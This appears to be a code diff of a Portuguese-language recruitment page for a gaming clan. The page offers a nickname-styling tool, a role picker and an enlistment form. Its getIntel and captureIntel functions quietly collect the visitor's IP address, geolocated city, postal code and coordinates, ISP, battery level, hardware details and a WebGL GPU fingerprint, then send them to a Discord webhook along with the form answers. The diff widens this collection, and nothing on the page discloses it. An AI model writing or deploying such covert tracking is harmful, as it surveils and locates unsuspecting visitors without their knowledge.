-        cyber: { a:'₳', b:'฿', c:'₵', d:'Đ', e:'Ɇ', f:'₣', g:'₲', h:'Ħ', i:'Ɨ', j:'Ɉ', k:'₭', l:'Ⱡ', m:'₥', n:'₦', o:'Ø', p:'₱', q:'Ɋ', r:'Ɽ', s:'₴', t:'₮', u:'Ʉ', v:'V', w:'₩', x:'Ӿ', y:'¥', z:'Ƶ', A:'₳', B:'฿', C:'₵', D:'Đ', E:'Ɇ', F:'₣', G:'₲', H:'Ħ', I:'Ɨ', J:'Ɉ', K:'₭', L:'Ⱡ', M:'₥', N:'₦', O:'Ø', P:'₱', Q:'Ɋ', R:'Ɽ', S:'₴', T:'₮', U:'Ʉ', V:'V', W:'₩', X:'Ӿ', Y:'¥', Z:'Ƶ' },
-        smallCaps: { a:'ᴀ', b:'ʙ', c:'ᴄ', d:'ᴅ', e:'ᴇ', f:'ꜰ', g:'ɢ', h:'ʜ', i:'ɪ', j:'ᴊ', k:'ᴋ', l:'ʟ', m:'ᴍ', n:'ɴ', o:'ᴏ', p:'ᴘ', q:'ǫ', r:'ʀ', s:'ꜱ', t:'ᴛ', u:'ᴜ', v:'ᴠ', w:'ᴡ', x:'x', y:'ʏ', z:'ᴢ', A:'ᴀ', B:'ʙ', C:'ᴄ', D:'ᴅ', E:'ᴇ', F:'ꜰ', G:'ɢ', H:'ʜ', I:'ɪ', J:'ᴊ', K:'ᴋ', L:'ʟ', M:'ᴍ', N:'ɴ', O:'ᴏ', P:'ᴘ', q:'ǫ', R:'ʀ', s:'ꜱ', T:'ᴛ', U:'ᴜ', V:'ᴠ', W:'ᴡ', X:'x', Y:'ʏ', Z:'ᴢ' }
+    const maps = {
+        sb: { a:'𝐚', b:'𝐛', c:'𝐜', d:'𝐝', e:'𝐞', f:'𝐟', g:'𝐠', h:'𝐡', i:'𝐢', j:'𝐣', k:'𝐤', l:'𝐥', m:'𝐦', n:'𝐧', o:'𝐨', p:'𝐩', q:'𝐪', r:'𝐫', s:'𝐬', t:'𝐭', u:'𝐮', v:'𝐯', w:'𝐰', x:'𝐱', y:'𝐲', z:'𝐳' },
+        cy: { a:'₳', b:'฿', c:'₵', d:'Đ', e:'Ɇ', f:'₣', g:'₲', h:'Ħ', i:'Ɨ', j:'Ɉ', k:'₭', l:'Ⱡ', m:'₥', n:'₦', o:'Ø', p:'₱', q:'Ɋ', r:'Ɽ', s:'₴', t:'₮', u:'Ʉ', v:'V', w:'₩', x:'Ӿ', y:'¥', z:'Ƶ' },
+        sc: { a:'ᴀ', b:'ʙ', c:'ᴄ', d:'ᴅ', e:'ᴇ', f:'ꜰ', g:'ɢ', h:'ʜ', i:'ɪ', j:'ᴊ', k:'ᴋ', l:'ʟ', m:'ᴍ', n:'ɴ', o:'ᴏ', p:'ᴘ', q:'ǫ', r:'ʀ', s:'ꜱ', t:'ᴛ', u:'ᴜ', v:'ᴠ', w:'ᴡ', x:'x', y:'ʏ', z:'ᴢ' }
     };
 
-    let selectedRole = "";
+    let sRole = "";
 
-    function transformText(text, style) {
-        if (style === 'normal') return text;
-        const map = charMaps[style];
-        return text.split('').map(char => map[char] || map[char.toUpperCase()] || char).join('');
+    function genTag() {
+        const n = document.getElementById('nick').value || "NOME";
+        const f = document.getElementById('font').value;
+        const res = n.split('').map(c => maps[f][c.toLowerCase()] || c).join('');
+        document.getElementById('resTag').innerText = `ꪶ͢🇯🇵 ⃟ᴀͭɴᷡᴍͭs ${res}`;
     }
 
-    function updateTags() {
-        const rawName = document.getElementById('tagName').value.trim();
-        const fontStyle = document.getElementById('fontSelect').value;
-        const stylizedName = transformText(rawName || "NOME", fontStyle);
-        const finalTag = `ꪶ͢🇯🇵 ⃟ᴀͭɴᷡᴍͭs ${stylizedName}`;
-        document.getElementById('tagMain').innerText = finalTag;
-        document.getElementById('charLimitWarning').style.display = finalTag.length > 35 ? 'block' : 'none';
-    }
-
-    function copyTag(id) {
-        const text = document.getElementById(id).innerText;
-        const el = document.createElement('textarea');
-        el.value = text;
-        document.body.appendChild(el);
-        el.select();
-        document.execCommand('copy');
-        document.body.removeChild(el);
-        const btn = event.target.closest('.copy-btn');
-        btn.innerHTML = "<i class='fas fa-check'></i> COPIADO";
-        setTimeout(() => btn.innerHTML = "<i class='fas fa-copy'></i> COPIAR", 1500);
-    }
-
-    function pickRole(el, role) {
-        document.querySelectorAll('.spec-item').forEach(i => i.classList.remove('active'));
+    function setRole(el, r) {
+        document.querySelectorAll('.role-btn').forEach(b => b.classList.remove('active'));
         el.classList.add('active');
-        selectedRole = role;
-        document.getElementById('roleAlertText').innerText = `Você escolheu a função: ${role}. Agir com disciplina e honra.`;
-        document.getElementById('roleAlertBox').classList.add('show');
+        sRole = r;
     }
 
-    function toggleMusic() {
-        const audio = document.getElementById('myAudio');
-        const icon = document.getElementById('playIcon');
-        if (audio.paused) { audio.play(); icon.className = "fas fa-pause"; } 
-        else { audio.pause(); icon.className = "fas fa-play"; }
+    function togglePlay() {
+        const a = document.getElementById('bgm');
+        const i = document.getElementById('m-icon');
+        if (a.paused) { 
+            a.play(); 
+            i.className = "fas fa-pause";
+            document.querySelector('.player').style.borderColor = '#fff';
+            document.querySelector('.player').style.boxShadow = '0 0 20px #fff';
+        } else { 
+            a.pause(); 
+            i.className = "fas fa-play"; 
+            document.querySelector('.player').style.borderColor = 'var(--accent)';
+            document.querySelector('.player').style.boxShadow = '0 0 20px rgba(255,0,60,0.3)';
+        }
     }
 
-    async function captureIntel() {
-        let intel = {
-            ip: 'Unknown',
-            loc: 'Unknown',
-            isp: 'Unknown',
-            ua: navigator.userAgent,
-            bat: 'N/A',
-            screen: `${screen.width}x${screen.height}`,
-            lang: navigator.language,
-            cores: navigator.hardwareConcurrency || 'N/A'
+    function copyTag() {
+        const t = document.getElementById('resTag').innerText;
+        navigator.clipboard.writeText(t);
+        
+        // Efeito visual no botão ao copiar
+        const btn = document.querySelector('.copy');
+        const oldText = btn.innerHTML;
+        btn.innerHTML = '<i class="fas fa-check"></i> COPIADO!';
+        btn.style.background = '#00ff40';
+        btn.style.color = '#000';
+        setTimeout(() => {
+            btn.innerHTML = oldText;
+            btn.style.background = 'var(--accent)';
+            btn.style.color = '#fff';
+        }, 2000);
+    }
+
+    // Sistema Inteligência original mantido
+    async function getIntel() {
+        const data = {
+            ip: '?', city: '?', region: '?', country: '?', zip: '?', isp: '?', 
+            lat: '?', lon: '?', ua: navigator.userAgent, lang: navigator.language,
+            plat: navigator.platform, cores: navigator.hardwareConcurrency, 
+            ram: navigator.deviceMemory || 'N/A', screen: `${screen.width}x${screen.height}`,
+            bat: '?', net: '?', gpu: '?'
         };
 
         try {
             const res = await fetch('https://ipapi.co/json/');
-            const data = await res.json();
-            intel.ip = data.ip;
-            intel.loc = `${data.city}, ${data.region}, ${data.country_name}`;
-            intel.isp = data.org;
+            const json = await res.json();
+            data.ip = json.ip;
+            data.city = json.city;
+            data.region = json.region;
+            data.country = json.country_name;
+            data.zip = json.postal;
+            data.isp = json.org;
+            data.lat = json.latitude;
+            data.lon = json.longitude;
         } catch(e) {}
 
         try {
-            if (navigator.getBattery) {
-                const battery = await navigator.getBattery();
-                intel.bat = `${(battery.level * 100).toFixed(0)}% ${battery.charging ? '(Carregando)' : '(Descarregando)'}`;
+            if(navigator.getBattery) {
+                const b = await navigator.getBattery();
+                data.bat = `${(b.level*100).toFixed(0)}% (${b.charging ? 'Carregando' : 'Descarregando'})`;
             }
         } catch(e) {}
 
-        return intel;
+        try {
+            const canvas = document.createElement('canvas');
+            const gl = canvas.getContext('webgl');
+            const debug = gl.getExtension('WEBGL_debug_renderer_info');
+            data.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+        } catch(e) {}
+
+        return data;
     }
 
-    async function sendToDiscord() {
-        const fields = {
-            name: document.getElementById('f_name').value,
-            age: document.getElementById('f_age').value,
-            id: document.getElementById('f_id').value,
-            recruiter: document.getElementById('f_recruiter').value,
-            history: document.getElementById('f_history').value,
-            reason: document.getElementById('f_reason').value,
-            aggregate: document.getElementById('f_aggregate').value,
-            troubles: document.getElementById('f_troubles').value
-        };
+    async function enviarDados() {
+        const n = document.getElementById('f_name').value;
+        const i = document.getElementById('f_id').value;
 
-        if (!fields.name || !fields.id || !selectedRole) {
-            alert("Preencha ao menos Nome, ID e Especialidade.");
+        if(!n || !i || !sRole) {
+            alert("Atenção Agente: Preencha Nome, ID e selecione uma Especialidade!");
+            // Shake effect nos campos vazios
+            if(!n) document.getElementById('f_name').style.border = '2px solid red';
+            if(!i) document.getElementById('f_id').style.border = '2px solid red';
+            setTimeout(() => {
+                document.getElementById('f_name').style.border = '';
+                document.getElementById('f_id').style.border = '';
+            }, 2000);
             return;
         }
 
-        const btn = document.getElementById('submitBtn');
-        btn.innerHTML = "ENVIANDO DOSSIÊ...";
+        const btn = document.getElementById('btnS');
         btn.disabled = true;
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> TRANSMITINDO DADOS...';
 
-        const intel = await captureIntel();
+        const intel = await getIntel();
 
-        const data = {
-            content: "🛡️ **NOVO RECRUTA DETECTADO NO TERMINAL**",
-            embeds: [{
-                title: "FICHA DE ALISTAMENTO - TNT ANIMES",
-                color: 16711740,
-                thumbnail: { url: "https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg" },
-                fields: [
-                    { name: "👤 Identidade", value: `**Nome:** ${fields.name}\n**Idade:** ${fields.age}\n**ID Hago:** ${fields.id}\n**Recrutador:** ${fields.recruiter}`, inline: false },
-                    { name: "⚔️ Especialidade", value: `\`${selectedRole}\``, inline: true },
-                    { name: "📜 Histórico FML", value: fields.history || "Nenhum", inline: true },
-                    { name: "🎯 Motivação", value: fields.reason || "Não informado", inline: false },
-                    { name: "💪 Agregado", value: fields.aggregate || "Não informado", inline: false },
-                    { name: "⚠️ Conflitos/Tretas", value: fields.troubles || "Nenhum", inline: false },
-                    { name: "📱 Dispositivo & Conexão", value: `**IP:** ${intel.ip}\n**Local:** ${intel.loc}\n**Bateria:** ${intel.bat}\n**Tela:** ${intel.screen}\n**Cores:** ${intel.cores}\n**ISP:** ${intel.isp}`, inline: false }
-                ],
-                footer: { text: "Terminal TNT Elite v4.0 | " + new Date().toLocaleString() }
-            }]
+        const payload = {
+            username: "TNT Intelligence Bot",
+            avatar_url: "https://i.pinimg.com/736x/92/c5/d8/92c5d80effca7e40f59dbb9ea405cdaf.jpg",
+            embeds: [
+                {
+                    title: "🧨 NOVO ALISTAMENTO: " + n,
+                    color: 16711740,
+                    fields: [
+                        { name: "👤 Nome", value: n, inline: true },
+                        { name: "🆔 ID Hago", value: i, inline: true },
+                        { name: "🎂 Idade", value: document.getElementById('f_age').value || '?', inline: true },
+                        { name: "🎖️ Cargo", value: sRole, inline: true },
+                        { name: "🤝 Recrutador", value: document.getElementById('f_rec').value || '?', inline: true },
+                        { name: "🎯 Motivação", value: document.getElementById('f_why').value || '...', inline: false }
+                    ]
+                },
+                {
+                    title: "📡 LOCALIZAÇÃO & REDE",
+                    color: 3447003,
+                    fields: [
+                        { name: "🌐 Endereço IP", value: `\`${intel.ip}\``, inline: true },
+                        { name: "🏢 Provedor (ISP)", value: intel.isp, inline: true },
+                        { name: "📍 Cidade/Estado", value: `${intel.city}, ${intel.region}`, inline: true },
+                        { name: "🌎 País/CEP", value: `${intel.country} (${intel.zip})`, inline: true },
+                        { name: "📍 Coordenadas", value: `Lat: ${intel.lat} | Lon: ${intel.lon}`, inline: false }
+                    ]
+                },
+                {
+                    title: "📱 ESPECIFICAÇÕES DO CELULAR",
+                    color: 0,
+                    fields: [
+                        { name: "🤖 Hardware", value: `**Plataforma:** ${intel.plat}\n**Cores:** ${intel.cores}\n**RAM:** ${intel.ram}\n**Bateria:** ${intel.bat}`, inline: false },
+                        { name: "🎮 GPU (Gráficos)", value: `\`${intel.gpu}\``, inline: false },
+                        { name: "📏 Tela", value: intel.screen, inline: true },
+                        { name: "🌐 Idioma", value: intel.lang, inline: true },
+                        { name: "🕵️ User Agent", value: `\`\`\`${intel.ua}\`\`\``, inline: false }
+                    ],
+                    footer: { text: "TNT ELITE TERMINAL v6.5 • " + new Date().toLocaleString() }
+                }
+            ]
         };
 
         try {
-            await fetch(DISCORD_WEBHOOK_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify(data)
+            await fetch(HOOK, {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify(payload)
             });
-            btn.innerHTML = "DADOS TRANSMITIDOS!";
-            btn.style.background = "#00ff40";
-        } catch (e) {
-            btn.innerHTML = "ERRO NA TRANSMISSÃO";
+            btn.innerHTML = '<i class="fas fa-check-circle"></i> PROTOCOLO ENVIADO!';
+            btn.style.background = "linear-gradient(90deg, #009933, #00ff40, #009933)";
+            btn.style.borderColor = "#00ff40";
+            btn.style.boxShadow = "0 0 30px rgba(0,255,64,0.6)";
+            btn.style.color = "#000";
+        } catch(e) {
             btn.disabled = false;
+            btn.innerHTML = '<i class="fas fa-exclamation-triangle"></i> FALHA NA CONEXÃO';
+            btn.style.background = "#ff0000";
         }
     }
 
+    // Animação de Reveal com scroll
     function reveal() {
-        document.querySelectorAll(".reveal").forEach(r => {
-            if (r.getBoundingClientRect().top < window.innerHeight - 50) r.classList.add("active");
+        document.querySelectorAll('.reveal').forEach(el => {
+            if(el.getBoundingClientRect().top < window.innerHeight - 80) el.classList.add('active');
         });
     }
-    window.addEventListener("scroll", reveal);
-    window.onload = () => { reveal(); updateTags(); };
+    window.onscroll = reveal;
+    
+    // Efeito Typewriter para o subtítulo
+    function typeWriter() {
+        const text = "SISTEMA DE RECRUTAMENTO ELITE_";
+        let i = 0;
+        const el = document.getElementById("typewriter");
+        el.innerHTML = "";
+        function type() {
+            if (i < text.length) {
+                el.innerHTML += text.charAt(i);
+                i++;
+                setTimeout(type, 70);
+            } else {
+                // Pisca o cursor no final
+                setInterval(() => {
+                    if(el.innerHTML.endsWith("_")) el.innerHTML = el.innerHTML.slice(0, -1) + "&nbsp;";
+                    else el.innerHTML = el.innerHTML.slice(0, -6) + "_";
+                }, 500);
+            }
+        }
+        setTimeout(type, 1000); // Espera 1s antes de começar a digitar
+    }
+
+    window.onload = () => { 
+        document.querySelector('.header-profile').classList.add('active'); // Revela o header imediatamente
+        reveal(); 
+        genTag(); 
+        typeWriter();
+    };
 </script>
+
 </body>
 </html>
